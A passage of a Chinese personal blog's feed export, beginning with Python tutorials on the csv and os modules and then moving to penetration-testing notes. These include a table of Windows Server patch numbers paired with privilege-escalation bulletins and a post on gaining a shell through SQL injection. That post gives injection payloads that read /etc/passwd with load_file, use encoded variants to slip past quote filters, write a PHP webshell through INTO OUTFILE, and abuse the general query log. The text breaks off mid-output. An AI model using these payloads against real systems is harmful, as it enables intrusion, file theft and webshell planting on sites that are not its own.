title="CSV文件的写入"></a>CSV文件的写入</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以写入方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>,<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用writer方法，传入csv文件对象，得到的结果是一个CSVWriter对象</span></span><br><span class="line">writer = csv.writer(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用CSVWriter对象的writerow方法，一行行的写入数据</span></span><br><span class="line">writer.writerow([<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;age&#x27;</span>, <span class="string">&#x27;score&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以调用writerows方法，一次性写入多行数据</span></span><br><span class="line">writer.writerows([[<span class="string">&#x27;zhangsan&#x27;</span>, <span class="string">&#x27;18&#x27;</span>, <span class="string">&#x27;98&#x27;</span>],[<span class="string">&#x27;lisi&#x27;</span>, <span class="string">&#x27;20&#x27;</span>, <span class="string">&#x27;99&#x27;</span>], [<span class="string">&#x27;wangwu&#x27;</span>, <span class="string">&#x27;17&#x27;</span>, <span class="string">&#x27;90&#x27;</span>], [<span class="string">&#x27;jerry&#x27;</span>, <span class="string">&#x27;19&#x27;</span>, <span class="string">&#x27;95&#x27;</span>]])</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h5 id="CSV文件的读取"><a href="#CSV文件的读取" class="headerlink" title="CSV文件的读取"></a>CSV文件的读取</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以读取方式打开一个csv文件</span></span><br><span class="line">file = open(<span class="string">&#x27;steady.csv&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用csv模块的reader方法，得到的结果是一个可迭代对象</span></span><br><span class="line">reader = csv.reader(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对结果进行遍历，获取到结果里的每一行数据</span></span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">    print(row)</span><br><span class="line"></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;Python处理excel文档&quot;&gt;&lt;a href=&quot;#Python处理excel文档&quot; class=&quot;headerlink&quot; title=&quot;Python处理excel文档&quot;&gt;&lt;/a&gt;Python处理excel文档&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;https://</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python学习--os库的使用</title>
    <link href="http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/11/10/Python%E5%AD%A6%E4%B9%A0--os%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2020-11-10T00:34:13.000Z</published>
    <updated>2020-11-10T01:29:26.011Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OS"><a href="#OS" class="headerlink" title="OS"></a>OS</h1><p>OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。</p><h2 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h2><h3 id="获取当前系统"><a href="#获取当前系统" class="headerlink" title="获取当前系统"></a>获取当前系统</h3><figure class="highlight python"><figcaption><span>y</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">print(os.name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#若是Windows则输出&#39;nt&#39;，若是Linux&#x2F;Unix，则是&#39;posix&#39;</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的绝对路径"><a href="#获取当前文件的绝对路径" class="headerlink" title="获取当前文件的绝对路径"></a>获取当前文件的绝对路径</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = os.path.abspath(__file__)</span><br><span class="line">print(steady_path)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py</span><br></pre></td></tr></table></figure><h3 id="获取当前目录"><a href="#获取当前目录" class="headerlink" title="获取当前目录"></a>获取当前目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">cwd &#x3D; os.getcwd()</span><br><span class="line">print(cwd)</span><br></pre></td></tr></table></figure><p>输出：获取的是python的工作目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple</span><br></pre></td></tr></table></figure><h3 id="判断文件是否存在，返回值为布尔型"><a href="#判断文件是否存在，返回值为布尔型" class="headerlink" title="判断文件是否存在，返回值为布尔型"></a>判断文件是否存在，返回值为布尔型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_path = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line">steady_file = os.path.exists(steady_path)</span><br><span class="line">print(<span class="string">&quot;file path: [&#123;&#125;] is exist: &#123;&#125;&quot;</span>.format(steady_path, steady_file))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file path: [&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady.py] is exist: True</span><br></pre></td></tr></table></figure><h3 id="获取当前文件的名称"><a href="#获取当前文件的名称" class="headerlink" title="获取当前文件的名称"></a>获取当前文件的名称</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">steady_name = os.path.basename(__file__)</span><br><span class="line">print(steady_name)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady.py</span><br></pre></td></tr></table></figure><h3 id="文件重命名"><a href="#文件重命名" class="headerlink" title="文件重命名"></a>文件重命名</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">old_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">new_file = <span class="string">r&quot;/Users/apple/Desktop/steady.py&quot;</span></span><br><span class="line"></span><br><span class="line">os.rename(old_file, new_file)</span><br></pre></td></tr></table></figure><h3 id="创建文件夹"><a href="#创建文件夹" class="headerlink" title="创建文件夹"></a>创建文件夹</h3><h4 id="os-makedirs"><a href="#os-makedirs" class="headerlink" title="os.makedirs"></a><code>os.makedirs</code></h4><p>创建多级目录，路径中的多个文件夹都不存在时，可以递归创建，steady和steady1文件夹本身没有。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h4 id="os-path-mkdir"><a href="#os-path-mkdir" class="headerlink" title="os.path.mkdir"></a><code>os.path.mkdir</code></h4><p>只能创建一个文件夹， steady文件夹存在，才能创建steady1文件夹，如果steady文件夹不存在，则会出错。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady&#x2F;steady1&quot;</span><br><span class="line">os.mkdir(steady_path)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件名"><a href="#获取文件夹下的所有文件名" class="headerlink" title="获取文件夹下的所有文件名"></a>获取文件夹下的所有文件名</h3><p>获取文件夹code下的所有文件名，以列表的形式返回。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">steady_path &#x3D; r&quot;&#x2F;Users&#x2F;apple&quot;</span><br><span class="line">steady_names &#x3D; os.listdir(steady_path)</span><br><span class="line">print(steady_names)</span><br></pre></td></tr></table></figure><h3 id="获取文件夹下的所有文件夹和文件（无递归遍历）"><a href="#获取文件夹下的所有文件夹和文件（无递归遍历）" class="headerlink" title="获取文件夹下的所有文件夹和文件（无递归遍历）"></a>获取文件夹下的所有文件夹和文件（无递归遍历）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(os.scandir(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;&quot;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;posix.ScandirIterator object at 0x1056a1e30&gt;</span><br></pre></td></tr></table></figure><p>返回的是可迭代对象，可以用for循环迭代一下遍出结果。</p><h3 id="f-is-file"><a href="#f-is-file" class="headerlink" title="f.is_file()"></a>f.is_file()</h3><p>is_file判断是否是文件。</p><h3 id="将path分割成路径名和文件名"><a href="#将path分割成路径名和文件名" class="headerlink" title="将path分割成路径名和文件名"></a>将path分割成路径名和文件名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;))</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[0])</span><br><span class="line">print(os.path.split(r&quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;steady1.py&quot;)[1])</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Users&#x2F;apple&#x2F;Desktop</span><br><span class="line">steady1.py</span><br></pre></td></tr></table></figure><h3 id="拼接目录与文件名或目录"><a href="#拼接目录与文件名或目录" class="headerlink" title="拼接目录与文件名或目录"></a>拼接目录与文件名或目录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">print(os.path.join(&#39;I&#39;, &#39;am&#39;, &#39;steady&#39;))</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">I&#x2F;am&#x2F;steady</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;OS&quot;&gt;&lt;a href=&quot;#OS&quot; class=&quot;headerlink&quot; title=&quot;OS&quot;&gt;&lt;/a&gt;OS&lt;/h1&gt;&lt;p&gt;OS模块简单的来说它是一个Python的系统编程的操作模块，可以处理文件和目录这些我们日常手动需要做的操作。&lt;/p&gt;
&lt;h2 id=&quot;使用方</summary>
      
    
    
    
    <category term="Python学习" scheme="http://s1eady.top/categories/Python%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="Python" scheme="http://s1eady.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--windows系统常见漏洞与系统补丁</title>
    <link href="http://s1eady.top/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/"/>
    <id>http://s1eady.top/2020/11/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%B3%BB%E7%BB%9F%E8%A1%A5%E4%B8%81/</id>
    <published>2020-11-06T21:03:06.000Z</published>
    <updated>2020-11-21T08:40:54.028Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Win2003"><a href="#Win2003" class="headerlink" title="Win2003"></a>Win2003</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">KB2360937|MS10-084</span><br><span class="line">KB2478960|MS11-014</span><br><span class="line">KB2507938|MS11-056</span><br><span class="line">KB2566454|MS11-062</span><br><span class="line">KB2646524|MS12-003</span><br><span class="line">KB2645640|MS12-009</span><br><span class="line">KB2641653|MS12-018</span><br><span class="line">KB944653|MS07-067</span><br><span class="line">KB952004|MS09-012 PR</span><br><span class="line">KB971657|MS09-041</span><br><span class="line">KB2620712|MS11-097</span><br><span class="line">KB2393802|MS11-011</span><br><span class="line">KB942831|MS08-005</span><br><span class="line">KB2503665|MS11-046</span><br><span class="line">KB2592799|MS11-080</span><br><span class="line">KB956572|MS09-012烤肉</span><br><span class="line">KB2621440|MS12-020</span><br><span class="line">KB977165|MS10-015Ms Viru</span><br><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day 限32位</span><br><span class="line">KB2707511|MS12-042  sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2008"><a href="#Win2008" class="headerlink" title="Win2008"></a>Win2008</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure><h1 id="Win2012"><a href="#Win2012" class="headerlink" title="Win2012"></a>Win2012</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">KB3139914|MS16-032</span><br><span class="line">KB3124280|MS16-016</span><br><span class="line">KB3134228|MS16-014</span><br><span class="line">KB3079904|MS15-097</span><br><span class="line">KB3077657|MS15-077</span><br><span class="line">KB3045171|MS15-051</span><br><span class="line">KB3000061|MS14-058</span><br><span class="line">KB2829361|MS13-046</span><br><span class="line">KB2850851|MS13-053EPATHOBJ 0day  限32位</span><br><span class="line">KB2707511|MS12-042 sysret -pid</span><br><span class="line">KB2124261|KB2271195  MS10-065 IIS7</span><br><span class="line">KB970483|MS09-020IIS6</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Win2003&quot;&gt;&lt;a href=&quot;#Win2003&quot; class=&quot;headerlink&quot; title=&quot;Win2003&quot;&gt;&lt;/a&gt;Win2003&lt;/h1&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://s1eady.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="http://s1eady.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试--shell获取</title>
    <link href="http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/"/>
    <id>http://s1eady.top/2020/11/01/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--shell%E8%8E%B7%E5%8F%96/</id>
    <published>2020-10-31T20:03:26.000Z</published>
    <updated>2020-12-02T07:37:03.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="渗透测试–shell获取"><a href="#渗透测试–shell获取" class="headerlink" title="渗透测试–shell获取"></a>渗透测试–shell获取</h1><h2 id="sql注入获取shell"><a href="#sql注入获取shell" class="headerlink" title="sql注入获取shell"></a>sql注入获取shell</h2><h3 id="联合注入读写shell"><a href="#联合注入读写shell" class="headerlink" title="联合注入读写shell"></a>联合注入读写shell</h3><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><p>1、对文件有写权限</p><p>2、文件大小小于<code>max_allowed_packet</code></p><p>3、<code>secure_file_priv</code>的值为空，该配置选项在my.ini文件中。</p><p>4、当前数据库用户要有FILE权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;2 union all select load_file(&#39;&#x2F;etc&#x2F;passwd&#39;)--+</span><br></pre></td></tr></table></figure><p>常见变形</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; UNION SELECT 1,2,load_file(char(99,58,47,98,111,111,116,46,105,110,105))--+ </span><br><span class="line">&#x2F;&#x2F;通过char()函数将ascii十进制形式转为字符形式，可绕过引号过滤</span><br><span class="line">?id&#x3D;-1&#39; UNION SELECT 1,2,load_file(0x633a2f626f6f742e696e69)                &#x2F;&#x2F;十六进制形式</span><br></pre></td></tr></table></figure><h4 id="写文件"><a href="#写文件" class="headerlink" title="写文件"></a>写文件</h4><p>1、对文件有写入权限</p><p>2、当前数据库用户要有FILE权限</p><p>3、<code>secure_file_priv</code>的值为空，或者在指定的目录下面</p><p>测试数据库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math;</span><br><span class="line">ERROR 2006 (HY000): MySQL server has gone away</span><br><span class="line">No connection. Trying to reconnect...</span><br><span class="line">Connection id:    371</span><br><span class="line">Current database: test</span><br><span class="line"></span><br><span class="line">+------+-----------+</span><br><span class="line">| id   | name      |</span><br><span class="line">+------+-----------+</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | 李明      |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|    1 | gongxinao |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">|    3 | chengxian |</span><br><span class="line">|   25 | gongcheng |</span><br><span class="line">+------+-----------+</span><br><span class="line">7 rows in set (0.05 sec)</span><br></pre></td></tr></table></figure><ul><li><p>select 内容 into outfile 文件目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#39; and 1&#x3D;2 union all select &#39;一句话木马&#39; into outfile &#39;&#x2F;tmp&#x2F;blablabla&#39;--+</span><br><span class="line">&#39; and 1&#x3D;2 union all select 十六进制 into outfile &#39;&#x2F;tmp&#x2F;blablabla&#39;--+</span><br><span class="line">&#39; and 1&#x3D;2 union all select 十六进制 into dumpfile &#39;&#x2F;tmp&#x2F;blablabla&#39;  </span><br></pre></td></tr></table></figure><p>区别：</p><p>into outfile 可以导出表中的每一行数据，不可以导出二进制数据，会在行末端写入新行，会转义换行符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math into outfile  &quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;3.txt&quot;;</span><br><span class="line">Query OK, 7 rows affected (0.00 sec)</span><br><span class="line">1gongxinao</span><br><span class="line">1李明</span><br><span class="line">1gongxinao</span><br><span class="line">1gongxinao</span><br><span class="line">25gongcheng</span><br><span class="line">3chengxian</span><br><span class="line">25gongcheng</span><br></pre></td></tr></table></figure><p>into dumpfile只能导出一行数据，可以导出二进制数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math into dumpfile  &quot;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;3.txt&quot;;</span><br><span class="line">ERROR 1172 (42000): Result consisted of more than one row</span><br></pre></td></tr></table></figure></li><li><p>FIELDS TERMINATED BY</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;1.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from math where id &#x3D; 1 into outfile &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.php&#39; fields terminated by 0x3c3f70687020706870696e666f28293b3f3e;</span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br><span class="line">1&lt;?php phpinfo();?&gt;李明</span><br><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br><span class="line">1&lt;?php phpinfo();?&gt;gongxinao</span><br></pre></td></tr></table></figure></li><li><p>lines terminated by</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;1.php&#39; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure></li><li><p>lines starting by</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username FROM user WHERE id &#x3D; 1 into outfile &#39;D:&#x2F;2.php&#39; LINES STARTING  BY 0x3c3f70687020706870696e666f28293b3f3e</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from math where id &gt; 2 into outfile &#39;&#x2F;Users&#x2F;apple&#x2F;Desktop&#x2F;1.php&#39; LINES TERMINATED BY 0x3c3f70687020706870696e666f28293b3f3e;</span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">25gongcheng&lt;?php phpinfo();?&gt;3chengxian&lt;?php phpinfo();?&gt;25gongcheng&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure><p>FIELDS TERMINATED BY 原理为在输出数据的每个字段之间插入webshell内容，如果select返回的只有一个字</p><p>段，则写入的文件不包含webshell内容。</p><p>LINES TERMINATED BY和LINES STARTING BY 原理为在输出每条记录的结尾或开始处插入webshell内容，只查询一个字段也可以写入webshell内容，更为通用。</p></li></ul><h5 id="报错注入读写shell"><a href="#报错注入读写shell" class="headerlink" title="报错注入读写shell"></a>报错注入读写shell</h5><p>报错注入读文件内容，有时候会由于报错长度受限或者文件编码问题，推荐采用hex编码方式分段读取文件内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user  where username &#x3D; &#39;&#39; and updatexml(0,concat(0x7e(LOAD_FILE(&#39;D:&#x2F;1.php&#39;)),0x7e),0)</span><br><span class="line"></span><br><span class="line">select * from user where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select (LOAD_FILE(&#39;D:&#x2F;1.php&#39;))),0x7e)))</span><br></pre></td></tr></table></figure><h5 id="判断文件是否存在"><a href="#判断文件是否存在" class="headerlink" title="判断文件是否存在"></a>判断文件是否存在</h5><p>load_file读取文件时，如果没有对应的权限获取或者文件不存在则函数返回NULL,所以结合isnull+load_file可以扫描判断文件名是否存在</p><h3 id="日志拿shell"><a href="#日志拿shell" class="headerlink" title="日志拿shell"></a>日志拿shell</h3><p>查看日志文件是否开启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like &quot;%general%&quot;;</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| Variable_name    | Value                               |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| general_log      | OFF                                 |</span><br><span class="line">| general_log_file | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F;ip-172-31-31-147.log |</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">2 rows in set (0.16 sec)</span><br></pre></td></tr></table></figure><p>开启日志文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; set global general_log&#x3D;&#39;on&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line">mysql&gt; show variables like &quot;%general%&quot;;</span><br><span class="line">+------------------+-------------------------------------+</span><br><span class="line">| 